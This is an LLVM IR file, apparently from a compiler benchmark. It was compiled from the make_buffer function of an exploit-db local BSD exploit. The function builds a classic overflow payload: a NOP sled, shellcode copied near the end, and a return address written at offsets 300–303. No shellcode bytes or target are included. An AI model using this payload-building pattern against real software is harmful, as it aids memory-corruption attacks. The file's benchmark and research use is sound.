; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_23063.c_make_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_23063.c_make_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@buffer = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFFERSIZE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @make_buffer(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  store i64 %0, i64* %2, align 8
  %7 = load i64, i64* %2, align 8
  %8 = and i64 %7, 255
  %9 = trunc i64 %8 to i8
  store i8 %9, i8* %3, align 1
  %10 = load i64, i64* %2, align 8
  %11 = and i64 %10, 65280
  %12 = lshr i64 %11, 8
  %13 = trunc i64 %12 to i8
  store i8 %13, i8* %4, align 1
  %14 = load i64, i64* %2, align 8
  %15 = and i64 %14, 16711680
  %16 = lshr i64 %15, 16
  %17 = trunc i64 %16 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i64, i64* %2, align 8
  %19 = and i64 %18, 4278190080
  %20 = lshr i64 %19, 24
  %21 = trunc i64 %20 to i8
  store i8 %21, i8* %6, align 1
  %22 = load i8*, i8** @buffer, align 8
  %23 = load i32, i32* @NOP, align 4
  %24 = load i32, i32* @BUFFERSIZE, align 4
  %25 = call i32 @memset(i8* %22, i32 %23, i32 %24)
  %26 = load i8*, i8** @buffer, align 8
  %27 = load i32, i32* @BUFFERSIZE, align 4
  %28 = sub nsw i32 %27, 4
  %29 = load i32, i32* @shellcode, align 4
  %30 = call i32 @strlen(i32 %29)
  %31 = sub nsw i32 %28, %30
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %26, i64 %32
  %34 = load i32, i32* @shellcode, align 4
  %35 = load i32, i32* @shellcode, align 4
  %36 = call i32 @strlen(i32 %35)
  %37 = call i32 @memcpy(i8* %33, i32 %34, i32 %36)
  %38 = load i8, i8* %3, align 1
  %39 = load i8*, i8** @buffer, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 300
  store i8 %38, i8* %40, align 1
  %41 = load i8, i8* %4, align 1
  %42 = load i8*, i8** @buffer, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 301
  store i8 %41, i8* %43, align 1
  %44 = load i8, i8* %5, align 1
  %45 = load i8*, i8** @buffer, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 302
  store i8 %44, i8* %46, align 1
  %47 = load i8, i8* %6, align 1
  %48 = load i8*, i8** @buffer, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 303
  store i8 %47, i8* %49, align 1
  ret i32 0
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
